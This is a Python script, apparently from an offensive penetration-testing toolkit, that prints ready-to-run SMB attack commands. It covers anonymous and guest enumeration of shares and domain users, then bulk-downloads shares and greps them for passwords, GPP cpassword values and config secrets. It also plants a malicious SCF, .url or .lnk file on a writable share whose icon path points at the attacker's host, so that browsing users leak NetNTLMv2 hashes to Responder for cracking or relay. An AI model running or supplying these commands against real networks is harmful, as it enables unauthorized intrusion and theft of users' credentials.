#!/usr/bin/env python3
"""SMB (445) foothold via anonymous/misconfig access. PRINTS commands. Edit LHOST in _services_common.py.

Usage:
  python3 gen_smb.py enum    --target 10.0.0.5        # null/guest session: shares, users, policy
  python3 gen_smb.py loot    --target 10.0.0.5 --share SYSVOL   # read a share, hunt creds
  python3 gen_smb.py capture --target 10.0.0.5 --share Writable # writable share -> SCF/LNK hash capture
"""
import sys
import _services_common as P

def opt(flag, default=None):
    return sys.argv[sys.argv.index(flag) + 1] if flag in sys.argv else default

arg = sys.argv[1] if len(sys.argv) > 1 else "enum"
t   = opt("--target", "<target>")
sh  = opt("--share", "<share>")

if arg == "enum":
    print(f"# SMB null/guest enum (no creds):")
    print(f"# needs: SMB null session and/or guest logon allowed on the target (else every line prompts / denies).")
    print(f"# order: most-reliable-first — null, then guest, then anon share list, then the full enum4linux sweep.")
    print(f"nxc smb {t} -u '' -p '' --shares                 # null session shares")
    print(f"#   -> ok: shares list printed (READ/WRITE column) = null session is allowed")
    print(f"nxc smb {t} -u guest -p '' --shares --users      # guest")
    print(f"#   -> ok: '[+]' guest login + a share/user list = guest is allowed")
    print(f"smbclient -N -L //{t}                            # list shares anonymously")
    print(f"#   -> ok: the share list prints WITHOUT a password prompt")
    print(f"enum4linux-ng -A {t}                             # users/groups/shares/policy/OS")
    print(f"nxc smb {t} -u guest -p '' --rid-brute           # RID cycling -> domain users (no share needed)")
    print(f"#   -> ok: a stream of DOMAIN\\<user> lines = RID cycling works")
    print(f"# -> readable share = loot;  writable share = capture;  a hit = which access you have.")

elif arg == "loot":
    print(f"# read a share + hunt credentials/keys/configs:")
    print(f"# needs: a READABLE share name in <share> (from `enum`); null/guest read access to it.")
    print(f"smbclient -N //{t}/{sh}")
    print(f"#   -> ok: you land at the `smb>` prompt (no password) = readable")
    print(f"#   smb> recurse ON; prompt OFF; mask \"\"; mget *      (pull everything)")
    print(f"# or mount + grep:")
    print(f"mount -t cifs //{t}/{sh} /mnt/smb -o guest,vers=3.0")
    print(f"grep -rIiE 'password|passwd|secret|connectionstring|Administrator' /mnt/smb 2>/dev/null | head")
    print(f"# high-value: unattend.xml · Groups.xml (GPP cpassword) · scripts/*.ps1|*.bat · web.config · .kdbx · backups")
    print(f"# found creds -> ../network/gen_shell.py  (turn them into a shell).")

elif arg == "capture":
    print(f"# WRITABLE share -> plant a file that forces any browsing user to auth to YOU -> capture NetNTLMv2.")
    print(f"# needs: WRITE access to <share> (READ/WRITE in the `enum` output) + a user who browses it in Explorer.")
    print(f"# 1) start Responder on the attacker:  responder -I eth0 -wv   (see ../network/gen_poison.py)")
    print(f"# 2) drop an SCF file into {sh} (fires when the user opens the folder in Explorer):")
    print(f"#    @evil.scf :")
    print(f"[Shell]")
    print(f"Command=2")
    print(f"IconFile=\\\\{P.LHOST}\\share\\x.ico")
    print(f"[Taskbar]")
    print(f"Command=ToggleDesktop")
    print(f"# upload it:  smbclient //{t}/{sh} -N -c 'put evil.scf'")
    print(f"#   -> ok: `put` reports the byte count (no NT_STATUS_ACCESS_DENIED) = the share is writable")
    print(f"# alternatives (most-reliable-first): SCF (above), then a .url (URL=file://{P.LHOST}/x), then a .lnk with an icon on \\\\{P.LHOST}, then desktop.ini.")
    print(f"# 3) wait for a user to browse the share -> NetNTLMv2 at your Responder -> crack or RELAY (../network/gen_relay.py).")
    print(f"#   -> ok: Responder prints a '[SMB] NTLMv2-SSP Hash' line for a real user = capture worked")
else:
    print("use: enum | loot | capture"); sys.exit(1)
